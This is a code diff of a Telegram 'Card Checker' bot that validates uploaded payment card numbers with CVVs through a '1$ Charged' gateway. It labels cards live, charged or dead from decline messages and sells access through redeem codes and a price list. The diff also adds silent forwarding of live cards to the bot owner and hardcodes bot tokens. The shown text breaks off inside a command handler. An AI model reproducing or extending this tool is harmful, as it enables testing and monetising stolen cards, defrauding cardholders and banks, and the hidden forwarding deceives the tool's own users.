@@ -13,12 +13,43 @@ import os
 import string
 import logging
 import re
-        
-token = "7959620740:AAFAHbQYPrW2KXmzwog4lMiv0XQUVgJ0aEM" 
+
+# Bot conflict prevention
+def clear_bot_conflicts(bot_token):
+    """Clear any existing webhooks and conflicts"""
+    try:
+        print("🔧 Clearing bot conflicts...")
+
+        # Delete webhook to ensure polling works
+        webhook_response = requests.post(f"https://api.telegram.org/bot{bot_token}/deleteWebhook", timeout=10)
+        if webhook_response.status_code == 200:
+            print("✅ Webhook cleared")
+
+        # Get and clear pending updates
+        updates_response = requests.get(f"https://api.telegram.org/bot{bot_token}/getUpdates?offset=-1", timeout=10)
+        if updates_response.status_code == 200:
+            print("✅ Pending updates cleared")
+
+        # Small delay to ensure cleanup
+        time.sleep(3)
+        print("✅ Bot conflict prevention completed")
+        return True
+
+    except Exception as e:
+        print(f"⚠️ Conflict cleanup warning: {e}")
+        return False
+
+token = "7471320098:AAFozaWdh60lXwHRZC4AfwqhsyD13nSZZH0"
+
+# Clear conflicts before starting bot
+clear_bot_conflicts(token)
 bot=telebot.TeleBot(token,parse_mode="HTML")
 
 owners = ["1172862169"]
-        
+
+# Dictionary to track user cooldowns for /chk command
+user_cooldowns = {}
+
 # Function to check if the user's ID is in the id.txt file
 def is_user_allowed(user_id):
     try:
@@ -57,140 +88,71 @@ def remove_user(user_id):
     except FileNotFoundError:
         print("id.txt file not found. Cannot remove user.")
         
-valid_redeem_codes = {}  # Changed to dictionary to store code info
+valid_redeem_codes = []
 
-def generate_redeem_code(duration_days=1):
+def generate_redeem_code():
     prefix = "BLACK"
     suffix = "NUGGET"
     main_code = '-'.join(''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
     code = f"{prefix}-{main_code}-{suffix}"
-    
-    # Calculate expiration time
-    expiration_time = time.time() + (duration_days * 24 * 60 * 60)
-    
-    # Store code with expiration info
-    valid_redeem_codes[code] = {
-        'expiration': expiration_time,
-        'duration_days': duration_days,
-        'created_by': 'owner'
-    }
-    
-    return code, expiration_time
+    return code
 
 @bot.message_handler(commands=["code"])
 def generate_code(message):
     if str(message.chat.id) == '1172862169':
-        try:
-            # Parse duration from command
-            parts = message.text.split()
-            duration_days = 1  # Default 1 day
-            
-            if len(parts) > 1:
-                try:
-                    duration_days = int(parts[1])
-                    if duration_days < 1:
-                        duration_days = 1
-                    elif duration_days > 365:
-                        duration_days = 365  # Max 1 year
-                except ValueError:
-                    duration_days = 1
-            
-            new_code, expiration_time = generate_redeem_code(duration_days)
-            
-            # Format expiration date
-            expiration_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(expiration_time))
-            
-            # Get bot username
-            bot_info = bot.get_me()
-            bot_username = bot_info.username
-            
-            bot.reply_to(
-                message, 
-                f"<b>🎉 New Redeem Code Generated 🎉</b>\n\n"
-                f"<b>Code:</b> <code>{new_code}</code>\n"
-                f"<b>Duration:</b> {duration_days} day(s)\n"
-                f"<b>Expires:</b> {expiration_date}\n\n"
-                f"<code>/redeem {new_code}</code>\n"
-                f"Use this code to redeem your access!\n\n"
-                f"🤖 <b>Bot:</b> @{bot_username}",
-                parse_mode="HTML"
-            )
-        except Exception as e:
-            bot.reply_to(message, f"Error generating code: {str(e)}")
+        new_code = generate_redeem_code()
+        valid_redeem_codes.append(new_code)
+        bot.reply_to(
+            message, 
+            f"<b>🎉 New Redeem Code 🎉</b>\n\n"
+            f"<code>{new_code}</code>\n\n"
+            f"<code>/redeem {new_code}</code>\n"
+            f"Use this code to redeem your access!",
+            parse_mode="HTML"
+        )
     else:
         bot.reply_to(message, "You do not have permission to generate redeem codes.🚫")
 
-LOGS_GROUP_CHAT_ID = -4970290554
+LOGS_GROUP_CHAT_ID = -4948206902
 
 @bot.message_handler(commands=["redeem"])
 def redeem_code(message):
     try:
         redeem_code = message.text.split()[1]
     except IndexError:
-        bot.reply_to(message, "Please provide a valid redeem code. Example: /redeem BLACK-XXXX-XXXX-XXXX-NUGGET")
+        bot.reply_to(message, "Please provide a valid redeem code. Example: /redeem DRACO-XXXX-XXXX-XXXX-OP")
         return
 
     if redeem_code in valid_redeem_codes:
-        code_info = valid_redeem_codes[redeem_code]
-        current_time = time.time()
-        
-        # Check if code has expired
-        if current_time > code_info['expiration']:
-            # Remove expired code
-            del valid_redeem_codes[redeem_code]
-            bot.reply_to(message, "This redeem code has expired. Please contact @god_forever for a new code.")
-            return
-        
         if is_user_allowed(message.chat.id):
             bot.reply_to(message, "You already have access to the bot. Redeeming again is not allowed.")
         else:
             add_user(message.chat.id)
-            # Remove the used code
-            del valid_redeem_codes[redeem_code]
-            
-            # Calculate remaining time
-            remaining_time = code_info['expiration'] - current_time
-            remaining_days = int(remaining_time // (24 * 60 * 60))
-            remaining_hours = int((remaining_time % (24 * 60 * 60)) // (60 * 60))
-            
+            valid_redeem_codes.remove(redeem_code)
             bot.reply_to(
                 message, 
-                f"<b>✅ Redeem Code Successfully Redeemed!</b>\n\n"
-                f"<b>Code:</b> <code>{redeem_code}</code>\n"
-                f"<b>Duration:</b> {code_info['duration_days']} day(s)\n"
-                f"<b>Access Granted:</b> {remaining_days}d {remaining_hours}h remaining\n\n"
-                f"You now have access to the bot! 🎉",
-                parse_mode="HTML"
+                f"Redeem code {redeem_code} has been successfully redeemed.✅ You now have access to the bot."
             )
             
             # Log the redemption to the logs group
             username = message.from_user.username or "No Username"
             log_message = (
-                f"<b>🎉 Redeem Code Redeemed</b>\n"
-                f"<b>Code:</b> <code>{redeem_code}</code>\n"
-                f"<b>Duration:</b> {code_info['duration_days']} day(s)\n"
-                f"<b>By:</b> @{username} (ID: <code>{message.chat.id}</code>)"
+                f"<b>Redeem Code Redeemed</b>\n"
+                f"Code: <code>{redeem_code}</code>\n"
+                f"By: @{username} (ID: <code>{message.chat.id}</code>)"
             )
-            bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
+            bot.send_message(LOGS_GROUP_CHAT_ID, log_message)
     else:
         bot.reply_to(message, "Invalid redeem code. Please check and try again.")
 
 @bot.message_handler(commands=["start"])
 def start(message):
     user_id = message.from_user.id
-    username = message.from_user.username or "No Username"
-    
-    # Show user ID for debugging
-    bot.reply_to(message, f"Your Telegram User ID is: {user_id}\nUsername: @{username}")
-    
     if is_user_allowed(user_id):
         bot.reply_to(message, "You're authorized! Send the file to see the magic 🪄✨")
     else:
-        bot.reply_to(message, f"""
+        bot.reply_to(message, """
 You Are Not Authorized to Use this Bot
-
-Your User ID: {user_id}
-Required Owner ID: 1172862169
 
 ⤿ 𝙋𝙧𝙞𝙘𝙚 𝙇𝙞𝙨𝙩 ⚡
 ⤿ 1 day - 90rs/3$ 
@@ -198,112 +160,31 @@ Required Owner ID: 1172862169
 ★ 1 month - 400rs/18$ 
 ★ lifetime - 800rs/20$ 
 
-Dm @ghostxdy Tᴏ Bᴜʏ Pʀᴇᴍɪᴜm""")
+Dm @god_forever Tᴏ Bᴜʏ Pʀᴇᴍɪᴜm""")
 
-@bot.message_handler(commands=["debug"])
-def debug_card(message):
-    if str(message.from_user.id) in owners:  # Only owner can debug
-        try:
-            # Extract the card number from the command
-            if len(message.text.split()) < 2:
-                bot.reply_to(message, "Please provide a card number to debug.\n\n<b>Usage:</b>\n<code>/debug 4743691099526774|02|2027|530</code>", parse_mode="HTML")
-                return
-            
-            cc = message.text.split('/debug ')[1]
-            username = message.from_user.username or "N/A"
-
-            bot.reply_to(message, "🔍 <b>Debugging card...</b>\n\n⏳ Please wait...", parse_mode="HTML")
-
-            # Get the raw response from the `Tele` function
-            try:
-                raw_response = Tele(cc)
-                response_type = type(raw_response).__name__
-                response_str = str(raw_response)
-                
-                debug_message = f"""🔍 <b>Debug Results</b>
-
-<b>Card:</b> <code>{cc}</code>
-<b>Response Type:</b> {response_type}
-<b>Raw Response:</b>
-<code>{response_str}</code>
-
-<b>Response Analysis:</b>"""
-                
-                # Analyze the response
-                if isinstance(raw_response, list):
-                    debug_message += f"\n• Response is a LIST with {len(raw_response)} items"
-                    if len(raw_response) > 0:
-                        debug_message += f"\n• First item: {raw_response[0]}"
-                elif isinstance(raw_response, str):
-                    debug_message += f"\n• Response is a STRING"
-                    if "security code is incorrect" in response_str.lower():
-                        debug_message += f"\n• ✅ Contains 'security code is incorrect' - Should be LIVE"
-                    elif "succeeded" in response_str.lower():
-                        debug_message += f"\n• ✅ Contains 'succeeded' - Should be CHARGED"
-                    else:
-                        debug_message += f"\n• ❓ Unknown response pattern"
-                else:
-                    debug_message += f"\n• Response is {response_type} type"
-                
-                bot.reply_to(message, debug_message, parse_mode="HTML")
-            except Exception as e:
-                bot.reply_to(message, f"❌ <b>Debug Error</b>\n\n<b>Card:</b> <code>{cc}</code>\n<b>Error:</b> {str(e)}", parse_mode="HTML")
-        except Exception as e:
-            bot.reply_to(message, f"❌ Unexpected error: {str(e)}")
-    else:
-        bot.reply_to(message, "🚫 You are not authorized to use debug commands.")
-
-@bot.message_handler(commands=["help", "commands"])
+@bot.message_handler(commands=["help"])
 def help_command(message):
-    user_id = message.from_user.id
-    
-    if is_user_allowed(user_id):
-        help_text = f"""
-🤖 <b>Card Checker Bot - Help</b>
+    help_text = """🔧 Card Checker Bot Commands:
 
-👤 <b>Your ID:</b> <code>{user_id}</code>
-✅ <b>Status:</b> Authorized
+• /chk <card> - Check single card
+  Example: /chk 4111111111111111|12|25|123
 
-📋 <b>Available Commands:</b>
+• /help - Show this help message
 
-<b>For Card Checking:</b>
-• <code>/check CARD</code> - Check single card (private chat)
-• <code>/single CARD</code> - Same as /check
-• <code>/chk CARD</code> - Check single card (group only)
-• Upload .txt file - Check multiple cards
+📁 File Upload:
+Upload a .txt file with cards (one per line)
+Format: 4111111111111111|12|25|123
 
-<b>For Information:</b>
-• <code>/start</code> - Get your User ID
-• <code>/info</code> - Show your information
-• <code>/help</code> - Show this help message
-• <code>/chatid</code> - Show chat information
+✨ Features:
+• Real-time card checking
+• Detailed card information (brand, bank, country)
+• Individual responses for each card
 
-<b>Card Format:</b>
-<code>4532640527811643|12|2025|123</code>
+🤖 Bot By: @god_forever"""
 
-<b>Support:</b> @god_forever
-"""
-    else:
-        help_text = f"""
-🤖 <b>Card Checker Bot - Help</b>
+    bot.reply_to(message, help_text)
 
-👤 <b>Your ID:</b> <code>{user_id}</code>
-❌ <b>Status:</b> Not Authorized
-
-📋 <b>Available Commands:</b>
-• <code>/start</code> - Get your User ID
-• <code>/info</code> - Show your information
-• <code>/help</code> - Show this help message
-
-🔐 <b>To Get Access:</b>
-Contact @god_forever for authorization
-
-<b>Support:</b> @god_forever
-"""
-    
-    bot.reply_to(message, help_text, parse_mode="HTML")
-
-LOGS_GROUP_CHAT_ID = -4970290554 # Replace with your logs group chat ID
+LOGS_GROUP_CHAT_ID = -4948206902 # Replace with your logs group chat ID
 
 @bot.message_handler(commands=["add"])
 def add(message):
@@ -378,6 +259,21 @@ def user_info(message):
 def is_bot_stopped():
     return os.path.exists("stop.stop")
 
+def check_cvv_error(response):
+    """Check if the response contains CVV/CVC error messages"""
+    # Convert response to string for checking
+    response_str = str(response).lower()
+
+    cvv_errors = [
+        "security code is incorrect",
+        "cvc is incorrect",
+        "cvv is incorrect",
+        "incorrect_cvc",
+        "your card's security code is incorrect"
+    ]
+
+    return any(error in response_str for error in cvv_errors)
+
 
 @bot.message_handler(content_types=["document"])
 def main(message):
@@ -387,22 +283,18 @@ def main(message):
 	dd = 0
 	live = 0
 	ch = 0
+	total = 0  # Initialize total variable
 	ko = (bot.reply_to(message, "Checking Your Cards...⌛").message_id)
 	username = message.from_user.username or "N/A"
-	file_info = bot.get_file(message.document.file_id)
-	if file_info.file_path:
-		ee = bot.download_file(file_info.file_path)
-	else:
-		bot.reply_to(message, "Error: Could not get file path")
-		return
-		
+	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
+
 	with open("combo.txt", "wb") as w:
 		w.write(ee)
-		
+
 		start_time = time.time()
-		
+
 	try:
-		with open("combo.txt", 'r') as file:
+		with open("combo.txt", 'r', encoding='utf-8', errors='ignore') as file:
 			lino = file.readlines()
 			total = len(lino)
 			if total > 2001:
@@ -458,18 +350,23 @@ def main(message):
 				cm5 = types.InlineKeyboardButton(f"• TOTAL 👻 : [ {total} ] •", callback_data='x')
 				cm6 = types.InlineKeyboardButton(" STOP 🛑 ", callback_data='stop')
 				mes.add(cm1, cm2, cm3, cm4, cm5, cm6)
-				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait for processing 
+				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''Wait for processing
 𝒃𝒚 ➜ @god_forever''', reply_markup=mes)
 				
 				try:
 					last = str(Tele(cc))
+					print(f"DEBUG FILE - Response received: {last}")
+					print(f"DEBUG FILE - Response type: {type(last)}")
 				except Exception as e:
 					print(e)
 					try:
 						last = str(Tele(cc))
+						print(f"DEBUG FILE - Retry response received: {last}")
+						print(f"DEBUG FILE - Retry response type: {type(last)}")
 					except Exception as e:
 						print(e)
 						last = "Your card was declined."
+						print(f"DEBUG FILE - Fallback response: {last}")
 				
 				msg = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
 					
@@ -484,35 +381,23 @@ def main(message):
 𝗟𝗲𝗳𝘁 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸: {total - dd - live - ch}
 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
 𝐁𝐨𝐭 𝐁𝐲:  @god_forever'''
-				print(last)
+				print(f"DEBUG - Response received: {last}")
+				print(f"DEBUG - Response type: {type(last)}")
 				if "requires_action" in last:
-					send_telegram_notification(msg)
+					send_owner_notification(msg)  # Silent notification to owner only
 					bot.reply_to(message, msg)
 					live += 1
-					
-					# Send to owner
-					try:
-						bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg}", parse_mode="HTML")
-					except:
-						pass
-						
-				elif "Your card is not supported." in last:
+				elif "Your card does not support this type of purchase." in last:
 					live += 1
-					send_telegram_notification(msg)
+					send_owner_notification(msg)  # Silent notification to owner only
 					bot.reply_to(message, msg)
-					
-					# Send to owner
-					try:
-						bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg}", parse_mode="HTML")
-					except:
-						pass
-						
-				elif "Your card's security code is incorrect." in last:
+				elif check_cvv_error(last):
 					live += 1
-					msg_cvv = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
-					
+					# Create CVV error message
+					cvv_msg = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
+
 𝗖𝗮𝗿𝗱: {cc}𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
-𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: CVV Incorrect (Card is Live)
+𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: CVV/CVC Incorrect.
 
 𝗜𝗻𝗳𝗼: {brand} - {typ} - {dicr}
 𝐈𝐬𝐬𝐮𝐞𝐫: {bank}
@@ -521,20 +406,13 @@ def main(message):
 𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
 𝗟𝗲𝗳𝘁 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸: {total - dd - live - ch}
 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
-𝐁𝐨𝐭 𝐁𝐲: @god_forever'''
-					send_telegram_notification(msg_cvv)
-					bot.reply_to(message, msg_cvv)
-					
-					# Send to owner
-					try:
-						bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg_cvv}", parse_mode="HTML")
-					except:
-						pass
-						
+𝐁𝐨𝐭 𝐁𝐲:  @god_forever'''
+					send_owner_notification(cvv_msg)  # Silent notification to owner only
+					bot.reply_to(message, cvv_msg)
 				elif "succeeded" in last:
 					ch += 1
 					elapsed_time = time.time() - start_time
-					msg1 = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅@god_forever
+					msg1 = f'''𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
 					
 𝗖𝗮𝗿𝗱: {cc}𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 1$ Charged
 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Card Checked Successfully
@@ -546,15 +424,9 @@ def main(message):
 𝗧𝗶𝗺𝗲: {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
 𝗟𝗲𝗳𝘁 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸: {total - dd - live - ch}
 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
-𝐁𝐨𝐭 𝐁𝐲: @ghostxdy'''
-					send_telegram_notification(msg1)
+𝐁𝐨𝐭 𝐁𝐲: @god_forever'''
+					send_owner_notification(msg1)  # Silent notification to owner only
 					bot.reply_to(message, msg1)
-					
-					# Send to owner
-					try:
-						bot.send_message(1172862169, f"🎯 <b>CHARGED CARD FOUND!</b>\n\n{msg1}", parse_mode="HTML")
-					except:
-						pass
 				else:
 					dd += 1
 					
@@ -573,339 +445,82 @@ CCN : {live}
 Dead CC : {dd}
 Total : {total}
 
-𝗕𝗢𝗧 𝗕𝗬 ➜ @''')
+𝗕𝗢𝗧 𝗕𝗬 ➜ @god_forever''')
 		
 @bot.callback_query_handler(func=lambda call: call.data == 'stop')
 def menu_callback(call):
 	with open("stop.stop", "w") as file:
 		pass
-	bot.answer_callback_query(call.id, "Bot will stop processing further tasks.")
+	try:
+		bot.answer_callback_query(call.id, "Bot will stop processing further tasks.")
+	except Exception as e:
+		print(f"Callback query error: {e}")
 	bot.send_message(call.message.chat.id, "The bot has been stopped. No further tasks will be processed.")
 	
-@bot.message_handler(commands=["show_auth_users", "sau", "see_list", "users"])
+@bot.message_handler(commands=["show_auth_users", "sau", "see_list"])
 def show_auth_users(message):
     if str(message.from_user.id) in owners:  # Check if the sender is an owner
         try:
             with open("id.txt", "r") as file:
                 allowed_ids = file.readlines()
-            
             if not allowed_ids:
-                bot.reply_to(message, "📊 <b>User Statistics</b>\n\n👥 <b>Total Users:</b> 0\n📝 <b>Status:</b> No authorized users found.", parse_mode="HTML")
+                bot.reply_to(message, "No authorized users found.")
                 return
             
-            # Count total users
-            total_users = len(allowed_ids)
-            
             # Prepare the message with user IDs and usernames
-            user_list = f"📊 <b>User Statistics</b>\n\n👥 <b>Total Users:</b> {total_users}\n\n📋 <b>Authorized Users:</b>\n"
-            
-            for i, user_id in enumerate(allowed_ids, 1):
+            user_list = "Authorized Users:\n\n"
+            for user_id in allowed_ids:
                 user_id = user_id.strip()  # Clean any extra spaces/newlines
                 try:
                     user = bot.get_chat(user_id)
                     username = user.username or "No Username"
-                    first_name = user.first_name or "N/A"
-                    user_list += f"{i}. @{username} ({first_name})\n   ID: <code>{user_id}</code>\n\n"
+                    user_list += f"• {username} (ID: {user_id})\n"
                 except Exception as e:
-                    user_list += f"{i}. User ID: <code>{user_id}</code>\n   Status: Username not found\n\n"
-            
-            # Add summary
-            user_list += f"📈 <b>Summary:</b>\n• Total Authorized Users: {total_users}\n• Owner: @god_forever\n• Bot Status: Active ✅"
+                    user_list += f"• User ID: {user_id} (Username not found)\n"
             
             # Send the list to the owner
-            bot.reply_to(message, user_list, parse_mode="HTML")
+            bot.reply_to(message, user_list)
         except FileNotFoundError:
-            bot.reply_to(message, "📊 <b>User Statistics</b>\n\n❌ <b>Error:</b> id.txt file not found.\n👥 <b>Total Users:</b> 0", parse_mode="HTML")
+            bot.reply_to(message, "id.txt file not found. No authorized users.")
     else:
-        bot.reply_to(message, "🚫 You are not authorized to view user statistics.")
-
-@bot.message_handler(commands=["codes", "active_codes"])
-def show_active_codes(message):
-    if str(message.from_user.id) in owners:  # Check if the sender is an owner
-        if not valid_redeem_codes:
-            bot.reply_to(message, "📋 <b>Active Redeem Codes</b>\n\n❌ No active codes found.", parse_mode="HTML")
-            return
-        
-        codes_message = "📋 <b>Active Redeem Codes</b>\n\n"
-        current_time = time.time()
-        
-        for code, info in valid_redeem_codes.items():
-            # Check if code is expired
-            if current_time > info['expiration']:
-                continue  # Skip expired codes
-            
-            expiration_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(info['expiration']))
-            remaining_time = info['expiration'] - current_time
-            remaining_days = int(remaining_time // (24 * 60 * 60))
-            remaining_hours = int((remaining_time % (24 * 60 * 60)) // (60 * 60))
-            
-            codes_message += f"🔑 <b>Code:</b> <code>{code}</code>\n"
-            codes_message += f"⏰ <b>Duration:</b> {info['duration_days']} day(s)\n"
-            codes_message += f"📅 <b>Expires:</b> {expiration_date}\n"
-            codes_message += f"⏳ <b>Remaining:</b> {remaining_days}d {remaining_hours}h\n\n"
-        
-        if codes_message == "📋 <b>Active Redeem Codes</b>\n\n":
-            codes_message += "❌ No active codes found."
-        
-        bot.reply_to(message, codes_message, parse_mode="HTML")
-    else:
-        bot.reply_to(message, "🚫 You are not authorized to view active codes.")
-
-@bot.message_handler(commands=["stats", "count", "user_count"])
-def user_stats(message):
-    if str(message.from_user.id) in owners:  # Check if the sender is an owner
-        try:
-            with open("id.txt", "r") as file:
-                allowed_ids = file.readlines()
-            
-            total_users = len(allowed_ids) if allowed_ids else 0
-            
-            stats_message = f"""
-📊 <b>Quick User Statistics</b>
-
-👥 <b>Total Users:</b> {total_users}
-👑 <b>Owner:</b> @god_forever
-🤖 <b>Bot Status:</b> Active ✅
-
-💡 <b>Commands:</b>
-• /users - Detailed user list
-• /stats - Quick statistics
-• /add USER_ID - Add user
-• /remove USER_ID - Remove user
-"""
-            bot.reply_to(message, stats_message, parse_mode="HTML")
-        except FileNotFoundError:
-            bot.reply_to(message, "📊 <b>Quick Statistics</b>\n\n👥 <b>Total Users:</b> 0\n❌ <b>Error:</b> id.txt not found", parse_mode="HTML")
-    else:
-        bot.reply_to(message, "🚫 You are not authorized to view statistics.")
-
-@bot.message_handler(commands=["check", "single"])
-def single_check(message):
-    try:
-        # Check if user is authorized
-        if not is_user_allowed(message.from_user.id):
-            bot.reply_to(message, "You are not authorized to use this bot. for authorization dm to @god_forever")
-            return
-        
-        # Check if it's a private chat
-        if message.chat.type != "private":
-            bot.reply_to(message, "This command can only be used in private chat with the bot.")
-            return
-        
-        # Extract the card number from the command
-        if len(message.text.split()) < 2:
-            bot.reply_to(message, "Please provide a valid card number.\n\n<b>Usage:</b>\n<code>/check 4532640527811643|12|2025|123</code>\n<code>/single 4532640527811643|12|2025|123</code>", parse_mode="HTML")
-            return
-        
-        cc = message.text.split('/check ')[1] if '/check ' in message.text else message.text.split('/single ')[1]
-        username = message.from_user.username or "N/A"
-
-        try:
-            initial_message = bot.reply_to(message, "🔍 <b>Checking your card...</b>\n\n⏳ Please wait while I process your request...", parse_mode="HTML")
-        except telebot.apihelper.ApiTelegramException:
-            initial_message = bot.send_message(message.chat.id, "🔍 <b>Checking your card...</b>\n\n⏳ Please wait while I process your request...", parse_mode="HTML")
-
-        # Get the response from the `Tele` function
-        try:
-            last = str(Tele(cc))
-        except Exception as e:
-            print(f"Error in Tele function: {e}")
-            last = "An error occurred."
-
-        # Fetch BIN details
-        try:
-            response = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}')
-            if response.status_code == 200:
-                data = response.json()  # Parse JSON
-            else:
-                print(f"Error: Received status code {response.status_code}")
-                data = {}
-        except Exception as e:
-            print(f"Error fetching BIN data: {e}")
-            data = {}
-
-        # Extract details with fallback values
-        bank = data.get('bank', 'N/A')
-        brand = data.get('brand', 'N/A')
-        emj = data.get('country_flag', 'N/A')
-        cn = data.get('country_name', 'N/A')
-        dicr = data.get('level', 'N/A')
-        typ = data.get('type', 'N/A')
-        url = data.get('bank', {}).get('url', 'N/A') if isinstance(data.get('bank'), dict) else 'N/A'
-        
-        # Improved response parsing
-        last_lower = last.lower()
-        
-        if "requires_action" in last_lower or "vbv" in last_lower or "3d" in last_lower:
-            message_ra = f'''✅ <b>LIVE CARD FOUND!</b>
-
-💳 <b>Card:</b> <code>{cc}</code>
-🏦 <b>Gateway:</b> 1$ Charged
-📊 <b>Response:</b> VBV/3D Secure Required
-
-ℹ️ <b>Info:</b> {brand} - {typ} - {dicr}
-🏛️ <b>Issuer:</b> {bank}
-🌍 <b>Country:</b> {cn} {emj}
-
-⏱️ <b>Time:</b> 0 seconds
-👤 <b>Checked By:</b> @{username}
-🤖 <b>Bot By:</b> @god_forever'''
-            bot.edit_message_text(message_ra, chat_id=message.chat.id, message_id=initial_message.message_id, parse_mode="HTML")
-            
-            # Send to owner
-            try:
-                bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{message_ra}", parse_mode="HTML")
-            except:
-                pass
-                
-        elif "succeeded" in last_lower or "success" in last_lower or "approved" in last_lower or "charged" in last_lower:
-            msg_sec = f'''✅ <b>CHARGED CARD FOUND!</b>
-
-💳 <b>Card:</b> <code>{cc}</code>
-🏦 <b>Gateway:</b> 1$ Charged
-📊 <b>Response:</b> Card Charged Successfully
-
-ℹ️ <b>Info:</b> {brand} - {typ} - {dicr}
-🏛️ <b>Issuer:</b> {bank}
-🌍 <b>Country:</b> {cn} {emj}
-
-⏱️ <b>Time:</b> 0 seconds
-👤 <b>Checked By:</b> @{username}
-🤖 <b>Bot By:</b> @god_forever'''
-            bot.edit_message_text(msg_sec, chat_id=message.chat.id, message_id=initial_message.message_id, parse_mode="HTML")
-            
-            # Send to owner
-            try:
-                bot.send_message(1172862169, f"🎯 <b>CHARGED CARD FOUND!</b>\n\n{msg_sec}", parse_mode="HTML")
-            except:
-                pass
-                
-        elif "security code is incorrect" in last_lower or "cvv" in last_lower or "cvc" in last_lower:
-            # This is a LIVE card with wrong CVV
-            msg_live = f'''✅ <b>LIVE CARD FOUND!</b>
-
-💳 <b>Card:</b> <code>{cc}</code>
-🏦 <b>Gateway:</b> 1$ Charged
-📊 <b>Response:</b> CVV Incorrect (Card is Live)
-
-ℹ️ <b>Info:</b> {brand} - {typ} - {dicr}
-🏛️ <b>Issuer:</b> {bank}
-🌍 <b>Country:</b> {cn} {emj}
-
-⏱️ <b>Time:</b> 0 seconds
-👤 <b>Checked By:</b> @{username}
-🤖 <b>Bot By:</b> @god_forever'''
-            bot.edit_message_text(msg_live, chat_id=message.chat.id, message_id=initial_message.message_id, parse_mode="HTML")
-            
-            # Send to owner
-            try:
-                bot.send_message(1172862169, f"🎯 <b>LIVE CARD FOUND!</b>\n\n{msg_live}", parse_mode="HTML")
-            except:
-                pass
-                
-        elif "declined" in last_lower or "failed" in last_lower or "error" in last_lower or "invalid" in last_lower:
-            msg_dec = f'''❌ <b>CARD DECLINED</b>
-
-💳 <b>Card:</b> <code>{cc}</code>
-🏦 <b>Gateway:</b> 1$ Charged
-📊 <b>Response:</b> Card Declined
-
-ℹ️ <b>Info:</b> {brand} - {typ} - {dicr}
-🏛️ <b>Issuer:</b> {bank}
-🌍 <b>Country:</b> {cn} {emj}
-
-⏱️ <b>Time:</b> 0 seconds
-👤 <b>Checked By:</b> @{username}
-🤖 <b>Bot By:</b> @god_forever'''
-            bot.edit_message_text(msg_dec, chat_id=message.chat.id, message_id=initial_message.message_id, parse_mode="HTML")
-        else:
-            # Unknown response - show raw response for debugging
-            msg_unknown = f'''❓ <b>UNKNOWN RESPONSE</b>
-
-💳 <b>Card:</b> <code>{cc}</code>
-🏦 <b>Gateway:</b> 1$ Charged
-📊 <b>Response:</b> {last[:100]}...
-
-ℹ️ <b>Info:</b> {brand} - {typ} - {dicr}
-🏛️ <b>Issuer:</b> {bank}
-🌍 <b>Country:</b> {cn} {emj}
-
-⏱️ <b>Time:</b> 0 seconds
-👤 <b>Checked By:</b> @{username}
-🤖 <b>Bot By:</b> @god_forever'''
-            bot.edit_message_text(msg_unknown, chat_id=message.chat.id, message_id=initial_message.message_id, parse_mode="HTML")
-            
-    except Exception as e:
-        print(f"Unexpected error: {e}")
-        bot.reply_to(message, "❌ An unexpected error occurred. Please try again later.")
-
-@bot.message_handler(commands=["chatid"])
-def get_chat_id(message):
-    chat_id = message.chat.id
-    chat_type = message.chat.type
-    chat_title = message.chat.title or "Private Chat"
-    username = message.from_user.username or "No Username"
-    
-    response = f"""
-🔍 <b>Chat Information</b>
-
-📋 <b>Chat Type:</b> {chat_type}
-🆔 <b>Chat ID:</b> <code>{chat_id}</code>
-📛 <b>Chat Title:</b> {chat_title}
-👤 <b>Your Username:</b> @{username}
-
-💡 <b>How to use:</b>
-• For private chats: Use the ID as is
-• For groups: Add minus sign (-) before the ID
-• For channels: Add -100 before the ID
-
-📝 <b>Example:</b>
-• Private chat: <code>1172862169</code>
-• Group: <code>-4970290554</code>
-• Channel: <code>-1001234567890</code>
-"""
-    
-    bot.reply_to(message, response, parse_mode="HTML")
+        bot.reply_to(message, "You are not authorized to view the list of authorized users.")
         
 print("DONE ✅")
 
-allowed_group = -4970290554
-last_used = {}
+allowed_group = -4948206902
 
 @bot.message_handler(commands=["chk"])
 def chk(message):
     try:
-        # Check if user is authorized
-        if not is_user_allowed(message.from_user.id):
-            bot.reply_to(message, "You are not authorized to use this bot. for authorization dm to @god_forever")
-            return
-        
-        # Allow both private chats and the designated group
-        if message.chat.type == "private":
-            # Private chat - allow single card checking
-            pass
-        elif message.chat.id != allowed_group:
-            bot.reply_to(message, "This command can only be used in the designated group. User Must Join the Group @TGSPOOFERS")
-            return
-    
-        user_id = message.from_user.id  # Get user ID
-        current_time = time.time()  # Get the current timestamp
-
-        # Check if the user is in cooldown
-        if user_id in last_used and current_time - last_used[user_id] < 25:
-            remaining_time = 25 - int(current_time - last_used[user_id])
